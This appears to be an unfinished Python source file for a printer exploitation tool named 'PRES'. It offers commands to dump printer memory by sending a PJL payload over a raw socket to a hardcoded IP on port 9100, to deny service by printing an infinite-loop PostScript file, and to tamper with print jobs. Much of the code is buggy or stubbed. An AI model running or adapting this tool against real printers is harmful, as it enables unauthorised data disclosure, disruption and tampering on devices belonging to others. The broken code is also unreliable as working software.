import os, sys, subprocess, socket, select

printers = []

class Printer:

	def __init__(self, name, connection, connectiontype):
		self.name = name
		self.conntype = connectiontype
		self.connection = connection

def commandListing():
	print(
		'''
		help, scan, overlay, quit, select, dos, dump
		''')

def dumpMemory():
	connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connection.connect(('129.21.252.19', 9100))
	connection.settimeout(15.0)
	with open('./payloads/pjl/information_disclosure/mem_dump.txt', 'r') as file:
		data = file.readlines()

	request = ''
	for item in data:
		request += item
	
	connection.send(request.encode())
	mem_contents = ''
	while True:
		try:
			response = connection.recv(1024)
			mem_contents += response.decode()
		except:
			print('[+] No More Data Being Sent Moving on To Processing!')
			break
	

	try:
		connection.close()
	except:
		pass

	output = mem_contents.split('\n')
	for value in output:
		if 'DATA' in value:
			content = value[5:]
			print(chr(int(content)), end='')
	print('')
	print('[+] Memory Dumping Complete!')

def dos(printer):
	print(f'[+] Initiating ddos of {printer.name}!')
	send(printer.conntype, printer, './payloads/postscript/DOS/infinite-loop.ps')

def send(conntype, printer, data):
	if conntype == 'Physical':
		subprocess.run(["lpr", "-P", f"{printer.name}", f"{data}"])
		return
	else:
		print('[-] Printer Connection Error! Try again or Restart!')
		return

def scan():
	print('[+] Scanning for Printers!')
	currentsize = 0
	#physical printer scanning
	print('[+] Scanning for Physically Connected Printers')
	output = subprocess.check_output(["lpstat", "-p"])
	decoded = output.decode()
	results = decoded.split('\n')
	for result in results:
		if "enabled" in result:
			name = result.split(' ')[1]
			conntype = 'Physical'
			connection = ''
			printers.append(Printer(name, connection, conntype))

	if len(printers) == 0:
		print('[-] No Physically Connected Printers Found')
	else:
		currentsize = len(printers)

	'''
	#network printer scanning
	print('[+] Scanning for Printers Connected to the Network using SNMP')
	#DO SNMP Broadcast thingie here

	if len(printers) == 0 or len(printers) == currentsize:
		print('[-] No Printers found via SNMP')
	else:
		currentsize = len(printers)


	#full direct scan of network
	choice = input('[+] Would you like to scan entire network for devices listening on port 9100? (Y/N): ')
	if choice.upper == 'Y':
		#do full scan

	else:
		print('[+] Will not scan entire network')

	print('[+] Scan Complete!')

	if len(printers) == 0:
		print('[-] No printers found on network or physically connected!')
		return
	'''
	for printer in printers:
		print(printer.name)


def overlay():
	print('[+] Initiating Print Job Manipulation')
	data = None
	overlayfile = input('Path to Overlay File: ')
	if overlayfilepath.endswith('ps'):
		print('[+] Obtained Postscript file reading data!')
		#TODO: read file
		try:
			with open(overlayfilepath, 'rb') as file:
				data = file.read()
		except IOError as error:
			print('[-] Error when reading file!')
	else:
		print('[+] Obtained Nonpostscript file converting into usable postscript')

		#TODO: Format file into postscript format
	
	#TODO: send new configuration changes to printer so all future print jobs have the overlay present

def main():
	print(
			'''
			Welcome to PRES!
			''')
	commandListing()

	'''
	HIGH LEVEL OVERVIEW OF TASKS
	
	SCAN FOR PRINTERS AND CHOOSE TARGET
	SEND DATA TO PRINTER OVER USB(LINUX) AND NETWORK
	FIGURE OUT HOW TO DO DDOS ATTACK AND SEND IT OVER

	'''

	while True:
		command = input('$ ')
		
		if command == 'help':
			commandListing()
		elif command == 'scan':
			scan()
		elif command == 'overlay':
			overlay()
		elif command == 'quit':
			sys.exit(0)
		elif command == 'dos':
			index = input('enter which index of a printer you would like: ')
			printer = printers[int(index)]
			dos(printer)
		elif command == 'dump':
			#index = input('enter which index of a printer you would like: ')
			#printer = printers[int(index)]
			dumpMemory()
		elif command == 'select':
			index = input('enter which index of a printer you would like: ')
			printer = printers[int(index)]
			send(printer.conntype, printer)
		else:
			print('[-] Command Not Recognized! Use help command to get listing of available commands!')
			print()

if __name__ == '__main__':
	main()